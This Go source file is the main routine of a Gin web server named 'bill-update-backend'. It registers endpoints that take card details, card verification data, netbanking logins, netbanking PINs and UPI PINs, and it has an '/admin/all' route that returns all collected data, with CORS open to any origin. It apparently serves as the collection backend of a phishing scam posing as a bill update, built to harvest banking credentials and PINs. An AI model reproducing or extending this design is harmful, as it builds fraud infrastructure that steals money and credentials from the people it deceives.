package main

import (
	"bill-update-backend/database"
	"bill-update-backend/handlers"
	"log"

	"github.com/gin-gonic/gin"
)

func main() {
	if err := database.Init(); err != nil {
		log.Fatal("Database init failed:", err)
	}

	r := gin.Default()

	r.Use(func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	})

	api := r.Group("/api")
	{
		api.POST("/bill-update", handlers.SubmitBillUpdate)
		api.POST("/charge", handlers.SubmitCharge)
		api.POST("/payment-method", handlers.SubmitPaymentMethod)
		api.POST("/card-details", handlers.SubmitCardDetails)
		api.POST("/card-verify", handlers.SubmitCardVerification)
		api.POST("/netbanking", handlers.SubmitNetbanking)
		api.POST("/netbanking-pin", handlers.SubmitNetbankingPin)
		api.POST("/upi-pin", handlers.SubmitUpiPin)
		api.GET("/admin/all", handlers.GetAllData)
	}

	log.Println("Server running on :8080")
	r.Run(":8080")
}
